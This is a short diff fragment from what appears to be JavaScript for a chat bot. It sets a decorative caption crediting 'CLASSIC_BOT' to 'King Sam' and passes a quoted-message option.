+			caption: "💢 𝐂𝐋𝐀𝐒𝐒𝐈𝐂_𝐁𝐎𝐓 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 🩸 ",    
                     }, {
                         quoted: m 
                     }
